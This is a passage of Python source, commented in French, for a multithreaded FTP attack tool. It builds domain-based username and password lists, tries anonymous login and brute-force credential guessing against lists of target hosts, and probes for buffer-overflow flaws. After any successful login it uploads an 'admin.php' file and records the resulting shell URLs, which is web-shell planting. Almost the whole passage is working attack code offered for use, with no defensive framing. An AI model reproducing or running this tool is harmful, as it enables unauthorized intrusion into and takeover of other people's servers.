        subdomain = parts[0] if len(parts) > 2 else ''
        
        all_words = re.findall(r'[a-zA-Z]+', domain)
        
        return {
            'domain': domain,
            'name': name,
            'words': words,
            'all_words': all_words,
            'numbers': numbers,
            'tld': tld,
            'subdomain': subdomain,
            'parts': parts,
            'hostname': hostname
        }
    except Exception as e:
        return None

def generate_smart_usernames(domain_info):
    """Generate smart usernames based on domain information - ÉTENDU"""
    usernames = set()
    
    high_priority_usernames = [
        'admin', 'administrator', 'root','infosys', 'ftp', 'user', 'test', 
        'demo', 'guest', 'anonymous', 'webmaster', 'manager',
        'adminftp', 'ftpadmin', 'www', 'www-data', 'http', 'nginx',
        'apache', 'mysql', 'oracle', 'postgres', 'mssql', 'info',
        'support', 'sales', 'contact', 'service', 'host', 'server',
        'backup', 'dbadmin', 'sysadmin', 'network', 'it', 'dev',
        'developer', 'testuser', 'test1', 'test2', 'demo1', 'demo2',
        'operator', 'supervisor', 'maintenance', 'upload', 'download',
        'files', 'data', 'storage', 'archive', 'backup', 'mirror',
        'public', 'shared', 'common', 'default', 'standard',
        'app', 'application', 'web', 'site', 'portal', 'cms',
        'wordpress', 'joomla', 'drupal', 'magento', 'prestashop',
        'shop', 'store', 'blog', 'news', 'media', 'image', 'video',
        'audio', 'doc', 'document', 'file', 'uploader', 'downloader',
        'client', 'customer', 'member', 'subscriber', 'partner',
        'vendor', 'supplier', 'distributor', 'reseller', 'dealer',
        'office', 'staff', 'employee', 'worker', 'assistant',
        'helpdesk', 'support', 'technical', 'tech', 'engineer',
        'developer', 'programmer', 'coder', 'designer', 'analyst',
        'tester', 'qa', 'quality', 'security', 'audit', 'compliance',
        'finance', 'accounting', 'billing', 'invoice', 'payment',
        'sales', 'marketing', 'advertising', 'promotion', 'seo',
        'social', 'media', 'content', 'editor', 'publisher',
        'author', 'writer', 'contributor', 'moderator', 'manager',
        'director', 'executive', 'ceo', 'cto', 'cfo', 'cio',
        'president', 'vicepresident', 'vp', 'head', 'chief',
        'lead', 'senior', 'junior', 'associate', 'intern',
        'student', 'teacher', 'professor', 'faculty', 'staff',
        'research', 'lab', 'library', 'archive', 'repository',
        'project', 'team', 'group', 'department', 'division',
        'branch', 'regional', 'local', 'global', 'international',
        'remote', 'virtual', 'cloud', 'hosting', 'server',
        'database', 'db', 'sql', 'nosql', 'cache', 'redis',
        'mongodb', 'elastic', 'search', 'index', 'log',
        'monitor', 'alert', 'report', 'stats', 'analytics',
        'api', 'rest', 'soap', 'graphql', 'microservice',
        'container', 'docker', 'kubernetes', 'cluster', 'node',
        'instance', 'vm', 'virtualmachine', 'cloud', 'aws',
        'azure', 'gcp', 'digitalocean', 'linode', 'vultr',
        'heroku', 'netlify', 'vercel', 'cloudflare', 'akamai',
        'cdn', 'proxy', 'gateway', 'router', 'switch', 'firewall',
        'security', 'firewall', 'antivirus', 'malware', 'virus',
        'spam', 'phishing', 'hack', 'hacker', 'cracker', 'security',
        'privacy', 'confidential', 'secret', 'topsecret', 'classified',
    ]
    usernames.update(high_priority_usernames)
    
    if domain_info:
        name = domain_info['name']
        domain = domain_info['domain']
        tld = domain_info['tld']
        subdomain = domain_info['subdomain']
        all_words = domain_info['all_words']
        
        if name and len(name) > 1:
            domain_based = [
                name,
                name + '1',
                name + '01',
                name + '123',
                name + 'admin',
                'admin' + name,
                name.capitalize(),
                name.lower(),
                name.upper(),
                'ftp' + name,
                name + 'ftp',
                name + 'user',
                'user' + name,
                name + 'test',
                'test' + name,
                name + 'web',
                'web' + name,
                name + '123',
                name + '2024',
                name + '2023',
                name + '2025',
                name + '2026',
                name + 'server',
                'server' + name,
                name + 'host',
                'host' + name,
                name + 'data',
                'data' + name,
                name + 'files',
                'files' + name,
                name + 'backup',
                'backup' + name,
                name + 'archive',
                'archive' + name,
                name + 'upload',
                'upload' + name,
                name + 'download',
                'download' + name,
                name + 'storage',
                'storage' + name,
                name + 'media',
                'media' + name,
                name + 'content',
                'content' + name,
                name + 'public',
                'public' + name,
                name + 'shared',
                'shared' + name,
                name + 'common',
                'common' + name,
                name + 'default',
                'default' + name,
                name + 'standard',
                'standard' + name,
                name + 'main',
                'main' + name,
                name + 'primary',
                'primary' + name,
                name + 'secondary',
                'secondary' + name,
                name + 'tertiary',
                'tertiary' + name,
                name + 'alpha',
                'alpha' + name,
                name + 'beta',
                'beta' + name,
                name + 'gamma',
                'gamma' + name,
                name + 'delta',
                'delta' + name,
            ]
            usernames.update(domain_based)
        
        for word in all_words:
            if len(word) > 2:
                usernames.add(word)
                usernames.add(word + 'admin')
                usernames.add('admin' + word)
                usernames.add(word + 'user')
                usernames.add('user' + word)
                usernames.add(word + 'ftp')
                usernames.add('ftp' + word)
                usernames.add(word + 'test')
                usernames.add('test' + word)
                usernames.add(word + 'dev')
                usernames.add('dev' + word)
                usernames.add(word + 'prod')
                usernames.add('prod' + word)
                usernames.add(word + 'staging')
                usernames.add('staging' + word)
        
        if tld and len(tld) > 1:
            usernames.update([
                tld + 'admin',
                'admin' + tld,
                tld + 'ftp',
                'ftp' + tld,
                tld + 'user',
                'user' + tld,
                tld + 'server',
                'server' + tld,
                tld + 'host',
                'host' + tld,
                tld + 'data',
                'data' + tld,
                tld + 'files',
                'files' + tld
            ])
        
        if subdomain and len(subdomain) > 1:
            usernames.update([
                subdomain,
                subdomain + 'admin',
                'admin' + subdomain,
                subdomain + 'ftp',
                'ftp' + subdomain,
                subdomain + 'user',
                'user' + subdomain,
                subdomain + 'server',
                'server' + subdomain,
                subdomain + 'host',
                'host' + subdomain
            ])
        
        if len(all_words) >= 2:
            for i in range(len(all_words)):
                for j in range(i+1, len(all_words)):
                    combo1 = all_words[i] + all_words[j]
                    combo2 = all_words[j] + all_words[i]
                    if len(combo1) <= 15:
                        usernames.add(combo1)
                    if len(combo2) <= 15:
                        usernames.add(combo2)
    
    numeric_usernames = [
        'test1', 'test2', 'test3', 'test4', 'test5', 'test6', 'test7', 'test8', 'test9', 'test10',
        'user1', 'user2', 'user3', 'user4', 'user5', 'user6', 'user7', 'user8', 'user9', 'user10',
        'admin1', 'admin2', 'admin3', 'admin4', 'admin5', 'admin6', 'admin7', 'admin8', 'admin9', 'admin10',
        'ftp1', 'ftp2', 'ftp3', 'ftp4', 'ftp5', 'ftp6', 'ftp7', 'ftp8', 'ftp9', 'ftp10',
        '001', '002', '003', '004', '005', '006', '007', '008', '009', '010',
        '100', '200', '300', '400', '500', '600', '700', '800', '900',
        '123', '321', '1234', '4321', '12345', '54321', '123456', '654321',
        '111', '222', '333', '444', '555', '666', '777', '888', '999',
        '000', '1111', '2222', '3333', '4444', '5555', '6666', '7777', '8888', '9999',
    ]
    usernames.update(numeric_usernames)
    
    filtered_usernames = []
    for username in usernames:
        if username and 1 <= len(username) <= 20:
            filtered_usernames.append(username)
    
    priority_order = sorted(filtered_usernames, key=lambda x: (len(x), x in high_priority_usernames), reverse=True)
    return priority_order[:200]

def generate_advanced_passwords(domain_info):
    """Generate advanced smart passwords with multiple strategies - ÉTENDU"""
    passwords = set()
    
    current_year = datetime.now().year
    current_month = datetime.now().month
    current_day = datetime.now().day
    
    if domain_info:
        name = domain_info['name']
        domain = domain_info['domain']
        tld = domain_info['tld']
        subdomain = domain_info['subdomain']
        all_words = domain_info['all_words']
        
        if name:
            base_patterns = [
                name, name.upper(), name.capitalize(),
                name + '1', name + '12', name + '123', name + '1234', name + '12345', name + '123456',
                name + '!', name + '@', name + '#', name + '$', name + '%',
                name + '2024', name + '2023', name + str(current_year),
                name + 'admin', 'admin' + name, name + 'ftp', 'ftp' + name,
                name + 'password', 'password' + name, name + 'pass', 'pass' + name,
                name + 'test', 'test' + name, name + 'user', 'user' + name,
                name + '!@#', name + '!@#$', name + '!@#$%',
                name + 'server', 'server' + name, name + 'host', 'host' + name,
                name + 'data', 'data' + name, name + 'files', 'files' + name,
                name + 'backup', 'backup' + name, name + 'archive', 'archive' + name,
                name + 'upload', 'upload' + name, name + 'download', 'download' + name,
                name + 'storage', 'storage' + name, name + 'media', 'media' + name,
                name + 'content', 'content' + name, name + 'public', 'public' + name,
                name + 'shared', 'shared' + name, name + 'common', 'common' + name,
                name + 'default', 'default' + name, name + 'standard', 'standard' + name,
                name + 'main', 'main' + name, name + 'primary', 'primary' + name,
            ]
            passwords.update(base_patterns)
        
        if domain:
            passwords.update([
                domain, domain + '123', domain + '!', domain + '@123',
                'admin@' + domain, 'ftp@' + domain, 'root@' + domain,
                'password@' + domain, 'pass@' + domain,
                'test@' + domain, 'user@' + domain, 'server@' + domain,
                'host@' + domain, 'data@' + domain, 'files@' + domain,
                'backup@' + domain, 'archive@' + domain, 'upload@' + domain,
                'download@' + domain, 'storage@' + domain, 'media@' + domain,
                'content@' + domain, 'public@' + domain, 'shared@' + domain
            ])
        
        if tld:
            passwords.update([
                tld, tld + '123', tld + '1234', tld + '!',
                'admin' + tld, tld + 'admin', tld * 3,
                tld + '!@#', tld + '2024', tld + 'ftp',
                'ftp' + tld, tld + 'server', 'server' + tld,
                tld + 'host', 'host' + tld, tld + 'data',
                'data' + tld, tld + 'files', 'files' + tld
            ])
        
        if subdomain:
            passwords.update([
                subdomain, subdomain + '123', subdomain + '!',
                subdomain + 'admin', 'admin' + subdomain,
                subdomain + 'ftp', 'ftp' + subdomain,
                subdomain + 'server', 'server' + subdomain,
                subdomain + 'host', 'host' + subdomain,
                subdomain + 'data', 'data' + subdomain,
                subdomain + 'files', 'files' + subdomain
            ])
        
        for word in all_words:
            if len(word) > 2:
                passwords.add(word)
                passwords.add(word + '123')
                passwords.add(word + '!')
                passwords.add(word.capitalize() + '123')
                passwords.add(word.upper() + '123')
                passwords.add(word + '2024')
                passwords.add(word + '!@#')
                passwords.add(word + 'ftp')
                passwords.add('ftp' + word)
                passwords.add(word + 'admin')
                passwords.add('admin' + word)
                passwords.add(word + 'server')
                passwords.add('server' + word)
                passwords.add(word + 'host')
                passwords.add('host' + word)
    
    common_passwords = [
        '123456', 'password', '12345678', 'qwerty', 'fireftp@example.com', '123456789',
        '12345', '1234', '111111', '1234567', 'dragon',
        '123123', 'baseball', 'abc123', 'football', 'monkey',
        'letmein', '696969', 'shadow', 'master', '666666',
        'qwertyuiop', '123321', 'mustang', '1234567890',
        'michael', '654321', 'superman', '1qaz2wsx', '7777777',
        'fuckyou', '121212', '000000', 'qazwsx', '123qwe',
        'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm',
        'asdfgh', 'hunter', 'buster', 'soccer', 'harley',
        'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou',
        '2000', 'charlie', 'robert', 'thomas', 'hockey',
        'ranger', 'daniel', 'starwars', 'klaster', '112233',
        'george', 'computer', 'michelle', 'jessica', 'pepper',
        '1111', 'zxcvbn', '555555', '11111111', '131313',
        'freedom', '777777', 'pass', 'maggie', '159753',
        'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese',
        'amanda', 'summer', 'love', 'ashley', 'nicole',
        'chelsea', 'biteme', 'matthew', 'access', 'yankees',
        '987654321', 'dallas', 'austin', 'thunder', 'taylor',
        'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring',
        'montana', 'moon', 'moscow', 'mother', 'password1',
        'ftp', 'ftp123', 'ftppass', 'ftpadmin', 'adminftp',
        'ftpuser', 'userftp', 'ftptest', 'testftp', 'ftppwd',
        'admin', 'admin123', 'administrator', 'root', 'toor',
        'pass', 'adminpass', 'adminpassword', 'admin@123',
        'test', 'test123', 'demo', 'demo123', 'guest', 'guest123',
        'user', 'user123', 'default', 'default123', 'server',
        'server123', 'host', 'host123', 'web', 'web123',
    ]
    passwords.update(common_passwords)
    
    advanced_numeric = []
    for i in range(1, 10):
        advanced_numeric.extend([
            str(i) * 6,
            str(i) * 8,
            '123' + str(i) * 3,
            str(i) * 3 + '123',
            str(i) * 4, str(i) * 5,
            '000' + str(i), '00' + str(i) * 2, '0' + str(i) * 3,
        ])
    
    for year in range(2000, current_year + 3):
        advanced_numeric.extend([
            str(year),
            'pass' + str(year),
            'admin' + str(year),
            'ftp' + str(year),
            str(year) + '!',
            str(year) + '@',
            str(year) + '#',
            str(year) + '!@#',
        ])
    
    date_patterns = [
        f"{current_year}",
        f"{current_year - 1}",
        f"{current_year - 2}",
        f"{current_day:02d}{current_month:02d}",
        f"{current_month:02d}{current_day:02d}",
        f"{current_year}{current_month:02d}",
        f"{current_month:02d}{current_year}",
        f"{current_day:02d}{current_month:02d}{current_year}",
        f"{current_year}{current_month:02d}{current_day:02d}",
    ]
    advanced_numeric.extend(date_patterns)
    passwords.update(advanced_numeric)
    
    keyboard_patterns = [
        'qwerty', 'qwertyuiop', 'qwertz', 'azerty', 'qazwsx', 
        'wsxedc', 'edcrfv', 'asdfgh', 'zxcvbn', 'asdfghjkl',
        'zxcvbnm', '1qaz2wsx', '1q2w3e4r', 'qweasd', 'qweasdzxc',
        'zaq12wsx', '!qaz2wsx', '1qaz@wsx', 'qwer1234', 'asdf1234',
        'zxcv1234', 'qazwsxedc', '123qwe', 'qwe123', '!qazxsw2',
        '1q2w3e', 'zaq1xsw2', 'password1', 'p@ssw0rd', 'P@ssw0rd',
        'P@SSW0RD', 'pa$$word', 'Pa$$word', 'Pass@123', 'Admin@123',
        'Admin@2024', 'Ftp@123', 'Ftp@2024', 'Root@123', 'Test@123',
        'Qwer1234', 'Asdf1234', 'Zxcv1234', '!QAZ2wsx', '1qazXSW@',
        '1qaz@WSX', '!QAZ@wsx', 'P@ssw0rd123', 'P@ssword123',
    ]
    passwords.update(keyboard_patterns)
    
    special_chars = ['!', '@', '#', '$', '%', '&', '*', '_', '-', '+', '=']
    base_words = ['admin', 'password', 'ftp', 'root', 'test', 'demo', 'user', 'pass', 'server', 'host']
    
    for word in base_words:
        for char in special_chars:
            passwords.add(word + char)
            passwords.add(word + char + '123')
            passwords.add(word.capitalize() + char)
            passwords.add(word.capitalize() + char + '123')
            passwords.add(word.upper() + char)
            passwords.add(word.upper() + char + '123')
        
        for char1 in special_chars[:3]:
            for char2 in special_chars[3:6]:
                passwords.add(word + char1 + '123' + char2)
                passwords.add(word.capitalize() + char1 + '2024' + char2)
    
    filtered_passwords = []
    for pwd in passwords:
        if pwd and 1 <= len(pwd) <= 30:
            filtered_passwords.append(pwd)
    
    priority_passwords = sorted(filtered_passwords, 
                              key=lambda x: (len(x), x in common_passwords[:50]), 
                              reverse=False)
    
    return priority_passwords[:300]

def test_ftp_connection(hostname, username, password, port=21, timeout=10):
    """Test FTP connection with given credentials"""
    try:
        ftp = ftplib.FTP()
        ftp.connect(hostname, port, timeout=timeout)
        ftp.login(username, password)
        
        try:
            ftp.retrlines('LIST')
        except:
            pass
            
        ftp.quit()
        return True
    except ftplib.error_perm as e:
        error_str = str(e).lower()
        if 'anonymous' in error_str and 'login incorrect' not in error_str:
            return 'anonymous_restricted'
        return False
    except ftplib.error_temp as e:
        return False
    except ftplib.error_reply as e:
        return False
    except Exception as e:
        return False

def test_anonymous_ftp(hostname, port=21, timeout=8):
    """Test anonymous FTP access"""
    try:
        ftp = ftplib.FTP()
        ftp.connect(hostname, port, timeout=timeout)
        ftp.login('anonymous', 'anonymous@example.com')
        
        try:
            ftp.retrlines('LIST')
            ftp.quit()
            return True, "Full anonymous access"
        except:
            ftp.quit()
            return True, "Anonymous login OK but restricted"
            
    except ftplib.error_perm as e:
        if 'anonymous' in str(e).lower():
            return False, "Anonymous not allowed"
        return False, str(e)
    except Exception as e:
        return False, str(e)

def bruteforce_ftp_target(target):
    """Brute force FTP target avec vérification préalable, détection de sous-domaines et vulnérabilités"""
    try:
        # Nettoyer la cible
        target = clean_target(target)
        if not target:
            with print_lock:
                print(f"{Colors.RED}[FTP-ERROR] Invalid target{Colors.RESET}")
            return False
        
        # Parse target (could be hostname or hostname:port)
        if ':' in target:
            hostname, port_str = target.split(':', 1)
            # Vérifier que le port est bien un nombre
            try:
                port = int(port_str)
                if port < 1 or port > 65535:
                    port = 21
            except ValueError:
                # Si le port n'est pas un nombre, utiliser le port 21 par défaut
                hostname = target
                port = 21
        else:
            hostname = target
            port = 21
        
        # ÉTAPE 1: Vérifier si le FTP est actif
        with print_lock:
            print(f"{Colors.CYAN}[FTP-CHECK] Testing {hostname}:{port}...{Colors.RESET}")
        
        is_active, status_msg = check_ftp_active(hostname, port)
        
        if not is_active:
            with print_lock:
                print(f"{Colors.RED}[FTP-INACTIVE] {hostname}:{port} - {status_msg}{Colors.RESET}")
            
            # Si le domaine principal n'est pas actif, chercher des sous-domaines FTP
            if '.' in hostname and not any(char.isdigit() for char in hostname.split('.')[0]):
                with print_lock:
                    print(f"{Colors.CYAN}[SUBDOMAIN-DISCOVERY] Attempting to discover FTP subdomains for {hostname}{Colors.RESET}")
                
                active_subdomains = discover_ftp_subdomains(hostname)
                
                if active_subdomains:
                    with print_lock:
                        print(f"{Colors.GREEN}[SUBDOMAIN-SUCCESS] Found {len(active_subdomains)} active FTP subdomains{Colors.RESET}")
                    
                    for subdomain in active_subdomains:
                        bruteforce_ftp_target(subdomain)
            
            with stats_lock:
                global_stats['failed'] += 1
            return False
        
        with print_lock:
            print(f"{Colors.GREEN}[FTP-ACTIVE] {hostname}:{port} - {status_msg}{Colors.RESET}")
        
        # Sauvegarder les FTP actifs
        with file_lock:
            with open(ACTIVE_FTP_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{hostname}:{port} - {status_msg}\n")
                f.flush()
        
        with stats_lock:
            global_stats['active_ftp'] += 1
        
        # ÉTAPE 2: Tester les vulnérabilités de buffer overflow
        with print_lock:
            print(f"{Colors.YELLOW}[VULN-SCAN] Testing for buffer overflow vulnerabilities on {hostname}:{port}{Colors.RESET}")
        
        is_vulnerable, vuln_details, exploit_success = test_buffer_overflow_vulnerabilities(hostname, port)
        
        # ÉTAPE 3: Tester l'accès anonyme en premier
        with print_lock:
            print(f"{Colors.YELLOW}[FTP-ANONYMOUS] Testing anonymous access on {hostname}:{port}{Colors.RESET}")
        
        anonymous_success, anonymous_msg = test_anonymous_ftp(hostname, port)
        if anonymous_success:
            with print_lock:
                print(f"{Colors.GREEN}[FTP-ANON-SUCCESS] {hostname}:{port} - {anonymous_msg}{Colors.RESET}")
            
            with file_lock:
                with open(RESULTS_FILE, 'a', encoding='utf-8') as f:
                    f.write(f"{hostname}:{port}#anonymous@anonymous - {anonymous_msg}\n")
                    f.flush()
            
            # Upload admin.php après succès anonyme
            with print_lock:
                print(f"{Colors.MAGENTA}[UPLOAD] Attempting to upload admin.php via anonymous access...{Colors.RESET}")
            
            upload_success, success_dirs, failed_dirs, shell_urls = upload_admin_php_improved(hostname, 'anonymous', 'anonymous@example.com', port)
            
            if upload_success:
                with print_lock:
                    print(f"{Colors.GREEN}[UPLOAD-SUCCESS] admin.php uploaded to directories: {success_dirs}{Colors.RESET}")
                    print(f"{Colors.GREEN}[SHELLS-SAVED] {len(shell_urls)} shell URLs saved to {SHELLS_FILE}{Colors.RESET}")
                with stats_lock:
                    global_stats['uploads_success'] += 1
            else:
                with print_lock:
                    print(f"{Colors.RED}[UPLOAD-FAILED] Failed to upload admin.php{Colors.RESET}")
                with stats_lock:
                    global_stats['uploads_failed'] += 1
            
            with stats_lock:
                global_stats['success'] += 1
                global_stats['anonymous_access'] += 1
            
            return True
        
        # ÉTAPE 4: Brute force intelligent
        domain_info = extract_domain_info(hostname)
        usernames = generate_smart_usernames(domain_info)
        passwords = generate_advanced_passwords(domain_info)
        
        with print_lock:
            print(f"{Colors.CYAN}[FTP-BRUTEFORCE] {hostname}:{port} - {len(usernames)} users, {len(passwords)} passwords{Colors.RESET}")
        
        total_attempts = 0
        max_total_attempts = len(usernames) * min(60, len(passwords))
        
        # STRATÉGIE 1: Essayer d'abord les combinaisons les plus probables
        high_probability_combinations = [
            ('admin', 'admin'), 
            ('admin', 'password'),
            ('admin', 'admin123'),
            ('root', 'root'), 
            ('root', 'password'), 
            ('ftp', 'ftp'), 
            ('anonymous', 'fireftp@example.com'),
            ('admin', '123456'), 
            ('admin', 'admin@123'), 
            ('administrator', 'password'),
            ('admin', 'admin123456'), 
            ('admin', 'Pass@123'), 
            ('admin', 'Admin@123'),
            ('ftp', 'ftp123'), 
            ('ftp', 'ftppass'), 
            ('test', 'test'),
            ('test', 'test123'), 
            ('demo', 'demo'), 
            ('demo', 'demo123'),
            ('user', 'user'), 
            ('user', 'user123'), 
            ('guest', 'guest'),
            ('webmaster', 'webmaster'), 
            ('webmaster', 'webmaster123'),
            ('admin', 'P@ssw0rd'), 
            ('admin', 'Pass@123'), 
            ('admin', 'Admin@123'),
            ('test', 'test'), 
            ('demo', 'demo'), 
            ('guest', 'guest'),
            ('admin', 'ftp'), 
            ('ftp', 'admin'), 
            ('root', 'admin'),
            ('admin', '1234'), 
            ('root', '123456'), 
            ('test', '123456'),
            ('admin', 'P@ssw0rd123'), 
            ('admin', 'Admin!234'), 
            ('admin', 'Admin#567'),
            ('admin', 'Admin$890'), 
            ('admin', 'Admin2023!'), 
            ('admin', 'Admin2024!'),
            ('administrator', 'Admin@123'), 
            ('administrator', 'P@ssw0rd!'),
            ('administrator', 'Admin!2024'), 
            ('root', 'Root@123'), 
            ('root', 'Root!456'),
            ('root', 'Root#789'), 
            ('root', 'Root$000'), 
            ('root', 'toor'), 
            ('root', 'r00t'),
            ('ftpadmin', 'ftpadmin'), 
            ('ftpadmin', 'Ftp@123'), 
            ('ftpadmin', 'Ftp!456'),
            ('ftpuser', 'ftpuser123'), 
            ('ftpuser', 'Ftp@user'), 
            ('ftptest', 'ftptest123'),
            ('ftp', 'Ftp@2024'), 
            ('ftp', 'Ftp!2023'), 
            ('ftp', 'ftp@123'),
            ('oracle', 'oracle'), 
            ('oracle', 'oracle123'), 
            ('cisco', 'cisco'),
            ('cisco', 'cisco123'), 
            ('juniper', 'juniper'), 
            ('juniper', 'juniper123'),
            ('microsoft', 'microsoft'), 
            ('microsoft', 'microsoft123'),
            ('dev', 'dev123'), 
            ('dev', 'Dev@123'), 
            ('developer', 'developer'),
            ('developer', 'developer123'), 
            ('deploy', 'deploy'), 
            ('deploy', 'deploy123'),
            ('system', 'system'), 
            ('system', 'system123'),
            ('network', 'network'),
            ('network', 'network123'), 
            ('server', 'server'), 
            ('server', 'server123'),
            ('backup', 'backup'), 
            ('backup', 'backup123'), 
            ('security', 'security'),
            ('admin', '12345678'), 
            ('admin', '123456789'), 
            ('admin', '1234567890'),
            ('root', '12345678'), 
            ('root', '123456789'), 
            ('ftp', '12345678'),
            ('admin', 'Admin2022!'), 
            ('admin', 'Admin2021!'), 
            ('admin', 'Admin2020!'),
            ('root', 'Root2023!'), 
            ('root', 'Root2022!'),
            ('admin', 'P@$$w0rd'), 
            ('admin', 'P@ssw0rd!'), 
            ('admin', 'Admin@2024'),
            ('admin', 'Admin!@#'),
            ('root', 'R00t!!'),
            ('root', 'R00t@2024'),
            ('admin', 'pass'), 
            ('admin', 'password1'), 
            ('admin', 'password123'),
            ('root', 'pass'), 
            ('root', 'password1'), 
            ('ftp', 'pass'),
            ('admin_user', 'admin123'), 
            ('ftp_user', 'ftp123'), 
            ('test_user', 'test123'),
            ('web_user', 'web123'), 
            ('db_user', 'db123'),
            ('admin', 'Admin@123'),
            ('admin', 'P@ssw0rd123'), 
            ('administrator', 'Admin2024!'),
            ('admin', 'P@ssw0rd!'),
            ('admin', 'Summer@2024'),
            ('admin', 'Welcome@123'),
            ('admin', 'ChangeMe!123'),
            ('admin', 'Temp@1234'),
            ('admin', 'Server@123'),
            ('admin', 'Domain@123'),
            ('admin', 'Network@123'),
            ('ftp', 'Ftp@Server2024'),
            ('backup', 'Backup@123'),
            ('admin', 'Abc@12345'),
            ('admin', 'Qwerty@123'),
            ('admin', 'Company123!'),
            ('admin', 'Headquarters@1'),
            ('admin', 'ProjectX@2024'),
            ('admin', 'Spring2024!'), 
            ('admin', 'January@123'), 
            ('admin', 'Q1@2024'), 
            ('admin', 'Week1@2024'),
            ('admin', 'DataCenter@1'), 
            ('admin', 'MainServer@123'),
            ('admin', 'Primary@123'), 
            ('admin', 'Prod@2024'),
            ('admin', 'Aa123456!'), 
            ('admin', 'Password1'),
            ('admin', 'Secret@123'), 
            ('admin', 'Key@2024'),
        ]
        
        for username, password in high_probability_combinations:
            try:
                result = test_ftp_connection(hostname, username, password, port)
                if result == True:
                    with print_lock:
                        print(f"{Colors.GREEN}[FTP-SUCCESS] {hostname}:{port} | {username}:{password}{Colors.RESET}")
                    
                    with file_lock:
                        with open(RESULTS_FILE, 'a', encoding='utf-8') as f:
                            f.write(f"{hostname}:{port}#{username}@{password}\n")
                            f.flush()
                    
                    with print_lock:
                        print(f"{Colors.MAGENTA}[UPLOAD] Attempting to upload admin.php with {username}:{password}{Colors.RESET}")
                    
                    upload_success, success_dirs, failed_dirs, shell_urls = upload_admin_php_improved(hostname, username, password, port)
                    
                    if upload_success:
                        with print_lock:
                            print(f"{Colors.GREEN}[UPLOAD-SUCCESS] admin.php uploaded to directories: {success_dirs}{Colors.RESET}")
                            print(f"{Colors.GREEN}[SHELLS-SAVED] {len(shell_urls)} shell URLs saved to {SHELLS_FILE}{Colors.RESET}")
                        with stats_lock:
                            global_stats['uploads_success'] += 1
                    else:
                        with print_lock:
                            print(f"{Colors.RED}[UPLOAD-FAILED] Failed to upload admin.php to most directories{Colors.RESET}")
                        with stats_lock:
                            global_stats['uploads_failed'] += 1
                    
                    with stats_lock:
                        global_stats['success'] += 1
                    
                    return True
                total_attempts += 1
            except:
                pass
        
        # STRATÉGIE 2: Combinaisons username=password
        for username in usernames[:20]:
            if total_attempts >= max_total_attempts:
                break
                
            try:
                result = test_ftp_connection(hostname, username, username, port)
                if result == True:
                    with print_lock:
                        print(f"{Colors.GREEN}[FTP-SUCCESS] {hostname}:{port} | {username}:{username}{Colors.RESET}")
                    
                    with file_lock:
                        with open(RESULTS_FILE, 'a', encoding='utf-8') as f:
                            f.write(f"{hostname}:{port}#{username}@{username}\n")
                            f.flush()
                    
                    upload_success, success_dirs, failed_dirs, shell_urls = upload_admin_php_improved(hostname, username, username, port)
                    if upload_success:
                        with stats_lock:
                            global_stats['uploads_success'] += 1
                        with print_lock:
                            print(f"{Colors.GREEN}[SHELLS-SAVED] {len(shell_urls)} shell URLs saved to {SHELLS_FILE}{Colors.RESET}")
                    else:
                        with stats_lock:
                            global_stats['uploads_failed'] += 1
                    
                    with stats_lock:
                        global_stats['success'] += 1
                    
                    return True
                total_attempts += 1
            except:
                pass
        
        # STRATÉGIE 3: Génération intelligente complète
        for username in usernames:
            if total_attempts >= max_total_attempts:
                break
                
            user_passwords = passwords[:50]
            
            for password in user_passwords:
                if total_attempts >= max_total_attempts:
                    break
                    
                try:
                    if total_attempts > 0 and total_attempts % 10 == 0:
                        time.sleep(1)
                    elif total_attempts > 0 and total_attempts % 5 == 0:
                        time.sleep(0.5)
                    
                    result = test_ftp_connection(hostname, username, password, port)
                    if result == True:
                        with print_lock:
                            print(f"{Colors.GREEN}[FTP-SUCCESS] {hostname}:{port} | {username}:{password}{Colors.RESET}")
                        
                        with file_lock:
                            with open(RESULTS_FILE, 'a', encoding='utf-8') as f:
                                f.write(f"{hostname}:{port}#{username}@{password}\n")
                                f.flush()
                        
                        upload_success, success_dirs, failed_dirs, shell_urls = upload_admin_php_improved(hostname, username, password, port)
                        if upload_success:
                            with stats_lock:
                                global_stats['uploads_success'] += 1
                            with print_lock:
                                print(f"{Colors.GREEN}[SHELLS-SAVED] {len(shell_urls)} shell URLs saved to {SHELLS_FILE}{Colors.RESET}")
                        else:
                            with stats_lock:
                                global_stats['uploads_failed'] += 1
                        
                        with stats_lock:
                            global_stats['success'] += 1
                        
                        return True
                    
                    total_attempts += 1
                    
                except Exception as e:
                    continue
        
        with print_lock:
            print(f"{Colors.RED}[FTP-FAILED] {hostname}:{port} - No valid credentials found ({total_attempts} attempts){Colors.RESET}")
        
        with stats_lock:
            global_stats['failed'] += 1
            
        return False
        
    except Exception as e:
        with print_lock:
            print(f"{Colors.RED}[FTP-ERROR] {target} - {str(e)}{Colors.RESET}")
        with stats_lock:
            global_stats['failed'] += 1
        return False

def process_ftp_targets(targets):
    """Process all FTP targets"""
    # Nettoyer toutes les cibles avant de commencer
    cleaned_targets = clean_targets_list(targets)
    
    if not cleaned_targets:
        with print_lock:
            print(f"{Colors.RED}[ERROR] No valid targets found after cleaning{Colors.RESET}")
        return
    
    with print_lock:
        print(f"{Colors.GREEN}[INFO] {len(cleaned_targets)} valid targets after cleaning{Colors.RESET}")
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for target in cleaned_targets:
            future = executor.submit(bruteforce_ftp_target, target)
            futures.append(future)
            time.sleep(0.1)
            
        completed = 0
        for future in as_completed(futures):
            try:
                future.result()
                completed += 1
                with stats_lock:
                    global_stats['checked'] = completed
                    
                if completed % 5 == 0:
                    elapsed = time.time() - global_stats['start_time']
                    rate = completed / elapsed if elapsed > 0 else 0
                    with print_lock:
                        print(f"\n{Colors.CYAN}[PROGRESS] {completed}/{len(cleaned_targets)} "
                              f"Rate: {rate:.1f}/s | Active: {global_stats['active_ftp']} | "
                              f"Success: {global_stats['success']} | Failed: {global_stats['failed']} | "
                              f"Subdomains: {global_stats['subdomains_found']} | "
                              f"BufferOverflow: {global_stats['buffer_overflow_vulns']}/{global_stats['buffer_overflow_exploited']} | "
                              f"Uploads: {global_stats['uploads_success']}/{global_stats['uploads_failed']} | "
                              f"Shells: {global_stats['shells_saved']}{Colors.RESET}\n")
            except:
                pass

# =============================================================================
# INTERFACE GRAPHIQUE AMÉLIORÉE
# =============================================================================

class FTPScanThread(QThread):
    progress_signal = pyqtSignal(int, int, str)
    result_signal = pyqtSignal(str)
    stats_signal = pyqtSignal(str)
